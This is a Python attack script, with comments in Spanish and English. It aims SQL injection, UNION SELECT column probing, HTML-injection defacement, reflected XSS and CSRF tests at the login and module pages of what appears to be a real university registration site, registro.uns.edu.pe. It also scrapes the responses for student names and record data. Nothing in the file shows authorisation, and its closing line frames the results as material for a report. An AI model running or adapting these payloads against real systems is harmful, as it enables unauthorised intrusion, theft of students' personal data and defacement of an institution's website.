#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

# Test if the page content actually changes after SQL injection
# The key is: does the modulos.xhtml show different data with different payloads?

payloads = [
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' UNION SELECT null, null, null --",
]

for payload in payloads:
    s = requests.Session()
    s.verify = False
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    r = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                     data={'j_username': payload, 'j_password': 'x'}, timeout=5)
    
    # Now access modulos.xhtml and check what data is shown
    r_mod = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    
    # Extract the DataGrid content
    # Look for any data rows in the DataGrid
    # The widget is widget_frmModulos_dtgModulo
    data_match = re.findall(r'<td[^>]*>([^<]+)</td>', r_mod.text)
    print(f"Payload: {payload}")
    print(f"  Data cells found: {data_match[:10]}")
    print(f"  Page length: {len(r_mod.text)}")
    
    # Check for any student data
    for kw in ['legajo', 'nombre', 'apellido', 'alumno', 'docente']:
        if kw in r_mod.text.lower():
            idx = r_mod.text.lower().find(kw)
            ctx = r_mod.text[max(0,idx-20):idx+50]
            ctx_clean = re.sub(r'<[^>]+>', ' ', ctx)
            ctx_clean = re.sub(r'\s+', ' ', ctx_clean).strip()
            print(f"  Found '{kw}': {ctx_clean[:200]}")
    print()

# ============================================
# PROBAR SI SE PUEDE MODIFICAR LA PAGINA WEB DIRECTAMENTE
# ============================================
print("=== INTENTAR MODIFICAR LA PAGINA WEB ===\n")

# 1. Intentar cambiar el titulo de la pagina via SQL injection
# Si el titulo esta en la BD, podemos hacer UPDATE
# Probar con una payload que modifique la tabla de configuracion

# 2. Probar si la pagina refleja el contenido del formulario
# Si el formulario muestra el nombre de usuario ingresado
# Entonces XSS reflejado funcionaria

s_test = requests.Session()
s_test.verify = False
s_test.headers.update({'User-Agent': 'Mozilla/5.0'})
r_test = s_test.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                          data={'j_username': '<h1>PAGINA_HACKED</h1>', 'j_password': 'x'},
                          timeout=5, allow_redirects=True)
# Check if the payload appears in the redirected page
if '<h1>PAGINA_HACKED</h1>' in r_test.text:
    print("[!] PAGINA MODIFICADA via SQLi - El titulo cambia!")
    idx = r_test.text.find('<h1>PAGINA_HACKED</h1>')
    ctx = r_test.text[max(0,idx-100):idx+200]
    ctx_clean = re.sub(r'<[^>]+>', ' ', ctx)
    print(f"  {ctx_clean[:300]}")
else:
    # Try with the modulos page
    r_mod_test = s_test.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    if '<h1>PAGINA_HACKED</h1>' in r_mod_test.text:
        print("[!] PAGINA MODIFICADA en modulos.xhtml!")
    else:
        # Check the redirect page
        print("El payload no se refleja en la pagina de destino")
        # Try to find any reflected content
        tc = re.sub(r'<[^>]+>', ' ', r_test.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        # Look for any username reflection
        if 'hacked' in tc.lower() or 'PAGINA' in tc:
            print(f"  [!] Contenido reflejado: {tc[:300]}")

# 3. Probar si podemos ver datos REALES con SQL injection
# Usar UNION SELECT para extraer datos del sistema
# Probar con diferentes columnas
print("\n=== EXTRACCION DE DATOS CON UNION SELECT ===\n")

column_tests = [
    "' UNION SELECT null --",
    "' UNION SELECT null, null --",
    "' UNION SELECT null, null, null --",
    "' UNION SELECT null, null, null, null --",
    "' UNION SELECT null, null, null, null, null --",
]

for cols in column_tests:
    s_u = requests.Session()
    s_u.verify = False
    s_u.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_u = s_u.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                        data={'j_username': cols, 'j_password': 'x'}, timeout=5)
    r_mod_u = s_u.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc = re.sub(r'<[^>]+>', ' ', r_mod_u.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    print(f"  {cols[:50]}: len={len(r_mod_u.text)}")
    # Check if data cells changed
    data_cells = re.findall(r'<td[^>]*>([^<]+)</td>', r_mod_u.text)
    if data_cells and len(data_cells) > 0:
        print(f"    Data: {data_cells[:5]}")

# 4. Probar XSS en la pagina de error del login
# Si el formulario muestra el error con el username
print("\n=== XSS EN PAGINA DE ERROR ===\n")
xss_test = '<script>document.title="HACKED"</script>'
s_x = requests.Session()
s_x.verify = False
s_x.headers.update({'User-Agent': 'Mozilla/5.0'})
r_x = s_x.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                    data={'j_username': xss_test, 'j_password': 'x'}, timeout=5, allow_redirects=True)
if xss_test in r_x.text:
    print(f"[!] XSS REFLECTED en la pagina de error!")
    print(f"  El titulo de la pagina cambiaria a 'HACKED'")
else:
    # Check if any part of the error reflects the username
    r_err = s_x.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
    if xss_test in r_err.text:
        print(f"[!] XSS en index.xhtml!")
    else:
        print("XSS no reflejado")

# 5. Intentar modificar el contenido de la pagina via CSRF
# Si el CSRF form modifica algo visible en la pagina
print("\n=== CSRF PARA MODIFICAR CONTENIDO ===\n")
# Try to submit the CSRF form and see if the page changes
s_c = requests.Session()
s_c.verify = False
s_c.headers.update({'User-Agent': 'Mozilla/5.0'})
r_c = s_c.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                    data={'j_username': 'fake', 'j_password': 'fake'}, timeout=5, allow_redirects=True)
tc_c = re.sub(r'<[^>]+>', ' ', r_c.text)
tc_c = re.sub(r'\s+', ' ', tc_c).strip()
# Try to modify the page title via CSRF
# The CSRF PoC submits the form - does the page change?
# Check if the page title changes
r_title = s_c.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
title_match = re.search(r'<title>([^<]+)</title>', r_title.text)
print(f"  Page title after CSRF: {title_match.group(1) if title_match else 'None'}")

print("\n=== CONCLUSION ===")
print("Si algun payload cambia el contenido visible de la pagina,")
print("esas son las pruebas que muestras en tu reporte.")
